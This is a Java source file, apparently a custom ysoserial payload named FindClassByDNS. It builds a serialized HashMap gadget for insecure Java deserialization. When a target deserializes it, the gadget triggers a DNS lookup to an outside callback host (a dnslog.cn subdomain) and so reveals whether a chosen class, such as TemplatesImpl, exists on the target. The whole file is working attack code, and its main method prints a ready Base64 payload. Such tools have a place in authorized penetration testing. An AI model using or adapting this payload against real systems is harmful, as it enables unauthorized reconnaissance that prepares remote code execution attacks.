package ysoserial.payloads;

import javassist.ClassPool;
import javassist.CtClass;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.Base64;
import java.util.HashMap;

public class FindClassByDNS implements ObjectPayload<Object> {
    public Object getObject(final String command) throws Exception{
        String[] cmds = command.split("\\|");

        if (cmds.length != 2){
            System.out.println("<url>|<class name>");
            return null;
        }
        String url = cmds[0];
        String clazz = cmds[1];

        System.out.println(url);
        System.out.println(clazz);

        URLStreamHandler handler = new SilentURLStreamHandler();

        URL u = new URL(null, url, handler);
        HashMap hashMap = new HashMap();
        hashMap.put(u, makeClass(clazz));
        Reflections.setFieldValue(u, "hashCode", -1);
        return hashMap;
    }
    public static void main(final String[] args) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(baos);
        objectOutputStream.writeObject(new FindClassByDNS().getObject("http://y8z71q.dnslog.cn|com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"));
        System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));
    }
    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
    public static Class makeClass(String clazzName) throws Exception{
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass(clazzName);
        Class clazz = ctClass.toClass();
        ctClass.defrost();
        return clazz;
    }
}
